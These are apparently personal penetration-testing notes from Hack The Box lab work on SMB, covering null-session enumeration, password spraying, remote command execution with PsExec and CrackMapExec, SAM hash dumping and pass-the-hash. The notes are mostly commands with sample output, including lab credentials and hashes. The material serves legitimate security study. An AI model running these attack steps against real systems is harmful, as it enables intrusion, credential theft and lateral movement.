# Anonymous Authentication Misconfiguration
--> Use null authentication 
--> Can add credentials when needed to the following tools

**Can Get**
- List of shares
- Usernames
- Groups
- Permissions
- Policies
- Services
- Etc..

**Use**
- smbclient
- smbmap
- rcpclient
- enum4linux
- Etc....


## File Share

### smbclient
- `-L` list server shares
- `-N` null authentication

```shell
smbclient -N -L \\\\<% tp.frontmatter["RHOSTS"] %>\\
```

 **Example**
```shell
smbclient -N -L \\\\10.129.42.197\\
```


### SMBmap
- enumerate shares 
- list of permissions for each shared folder

```shell
smbmap -H  <% tp.frontmatter["RHOSTS"] %>
```

**Example**
```shell
BluePho3nix@htb[/htb]$  smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                              Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                         NO ACCESS       Remote Admin
        C$                                                     NO ACCESS       Default share
        IPC$                                                 READ ONLY       IPC Service (DEVSM)
        notes                                               READ, WRITE   CheckIT
```

####  `-r` or `-R` (recursive option) to browse directories
```shell
smbmap -H <% tp.frontmatter["RHOSTS"] %> -r <share name>
```

**Example**
```shell
BluePho3nix@htb[/htb]$  smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

####  `READ`  permissions allow file download
```shell
 smbmap -H <% tp.frontmatter["RHOSTS"] %> --download "<share name>\<file name>"
```

**Example**
```shell
BlueTriangle@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

####  `WRITE` permissions allow file upload
```shell
 smbmap -H <% tp.frontmatter["RHOSTS"] %> --upload <file name> "<share name>\<file name>"

```

**Example**
```shell
BluePho3nix@htb[/htb]$  smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### Remote Procedure Call (RPC)
- Enumerate a workstation or Domain Controller
- Gather information
- Modify server attributes (ex: username)

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |
Find more commands: [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) 

```shell
rpcclient -U'%'  <% tp.frontmatter["RHOSTS"] %>
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

#### User Rid Enumeration - For Loop 
```shell
for i in $(seq 500 1100);do rpcclient -N -U "" <% tp.frontmatter["RHOSTS"] %> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

**Example**
```shell
BluePho3nix@htb[/htb]$  for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

### Enum4Linux-ng

**Automates many (not all) `nmblookup`, `net`, `rpcclient`,  `smbclient` queries including**
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

**Install**
```shell
git clone https://github.com/cddmp/enum4linux-ng.git && cd enum4linux-ng && pip3 install -r requirements.txt
```

**Run**
```shell
./enum4linux-ng.py   <% tp.frontmatter["RHOSTS"] %> -A -C
```

**Example**
```shell
BluePho3nix@htb[/htb]$  ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```


# Protocol Specifics Attacks

If null session is not allowed, we will need credentials. We can get credentials with [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

## Brute Forcing and Password Spray

**Brute Forcing**
- Can lock out an account if hit threshold

**Password Spraying**
- Better option
- Try with list of usernames and one common password
- Try more than one password if know the lockout threshold

### CrackMapExec (CME)
- Execute password spraying
- Can target multiple IPs with many users and passwords
- `-u` for user or user list
- `-p` for password or password list
- CME exits after a successful login is found. Use `--continue-on-success` to continue spraying even after a valid password is found
-  for non-domain joined computer need to use the option `--local-auth`

#### Domain joined computer
```shell
crackmapexec smb <% tp.frontmatter["RHOSTS"] %> -u <user list> -p '<password>'
```

#### Non-domain joined computer
```shell
crackmapexec smb <% tp.frontmatter["RHOSTS"] %> --local-auth -u <user list> -p '<password>'
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```


## SMB

**Linux & Windows**
- Access file system
- Abuse privileges
  
**Linux**
- Exploit known vulnerabilities in Linux environment

**Windows: if user is Administrator**
- Remote Command Execution
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)
- Extract Hashes from SAM Database to escalate privileges or gain access to network


### Remote Code Execution (RCE)


**Download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or use some Linux implementations**

| PsExec Linux implementations | Description |
| ---- | ---- |
| [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom) |
| [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) | A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available. |
| [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) | This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) |  includes an implementation of `smbexec` and `atexec`. |
| [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md)  | Ruby PsExec implementation. |

#### Impacket PsExec
- Need domain/username, password, IP. The same applies to `impacket-smbexec` and `impacket-atexec`.

```shell
 impacket-psexec <username>:'<password>'@<% tp.frontmatter["RHOSTS"] %> 
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```


#### CrackMapExec (CME)
- Advantage can run a command on multiple hosts at a time
- need username, password, IP
- `-u` username
- `-p` password
- `-x` run `cmd` commands
- `-X` run `powershell` commands
- If `--exec-method` is not defined  the atexec method will be tried, if it fails  specify the `--exec-method` smbexec
  
```shell
crackmapexec smb <% tp.frontmatter["RHOSTS"] %>  -x 'whoami' --exec-method smbexec -u <username> -p '<password>'
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

### Enumerating Logged-on Users
- If in a network with multiple machines that share the same local administrator account can use `CrackMapExec` to enumerate logged-on users on all machines within the same network

```shell
crackmapexec smb <% tp.frontmatter["RHOSTS"] %>/24  --loggedon-users  -u <username> -p '<password>' 
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

### Extract Hashes from SAM Database
**If have administrative privileges can extract the SAM database hashes and use them for**
- Authenticating as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash.

```shell
crackmapexec smb <% tp.frontmatter["RHOSTS"] %> --sam -u <username> -p '<password>' 
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

#### Pass-the-Hash (PtH)
If we get the NTLM hash of a user and we can't crack it, we can use Pass-the-Hash to authenticate over SMB (and more).

**We can use a PtH attack with**
- Any `Impacket` tool
- `SMBMap`
- `CrackMapExec`
- Etc..

```shell
crackmapexec smb <% tp.frontmatter["RHOSTS"] %>  -u <username> -H <NTLM hash>
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$  crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

#### RPC

- Change a user's password.
- Create a new domain user.
- Create a new shared folder.
- [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) 





















